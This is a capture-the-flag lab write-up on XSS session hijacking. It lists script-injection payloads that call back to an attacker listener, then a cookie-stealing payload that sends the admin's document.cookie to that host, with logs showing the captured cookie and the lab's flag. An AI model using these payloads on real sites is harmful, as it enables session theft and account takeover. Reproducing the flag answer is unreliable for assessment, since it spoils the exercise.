# Session Hijacking
## Questions
1. Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag. **Answer: HTB{4lw4y5_53cur3_y0ur_c00k135}**
   - Start a listening server:
        ```sh
        $ python -m http.server
        ```
   - Use Intruder to test each payload at each parameter and check which one got triggered:
        ```
        GET /hijacking/index.php?fullname=$123$&username=123&password=123&email=a%40gm.com&imgurl=123 HTTP/1.1
        ```
        ```
        <script src=http://10.10.14.76:8000?x=1></script>
        '><script src=http://10.10.14.76:8000?x=2></script>
        "><script src=http://10.10.14.76:8000?x=3></script>
        javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.14.76::8000?x=4\';document.body.appendChild(a)')
        <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.14.76:8000?x=5");a.send();</script>
        <script>$.getScript("http://10.10.14.76::8000?x=6")</script>
        ```
        → Payload `"><script src=http://10.10.14.76:8000?x=3></script>` got triggered for the parameter `fullname`:
        ```
        10.129.8.10 - - [26/May/2026 05:11:36] "GET /?x=3 HTTP/1.1" 200 -
        ```
   - Now send this request to exfiltrate the admin's cookie and use it to login:
        ```
        GET /hijacking/index.php?fullname="><script>document.location=`http://10.10.14.76:8000?x=${document.cookie}`</script>&username=123&password=123&email=a%40gm.com&imgurl=123 HTTP/1.1
        ```
        ```
        10.129.8.10 - - [26/May/2026 05:14:17] "GET /?x=cookie=c00k1355h0u1d8353cu23d HTTP/1.1" 200 -
        ```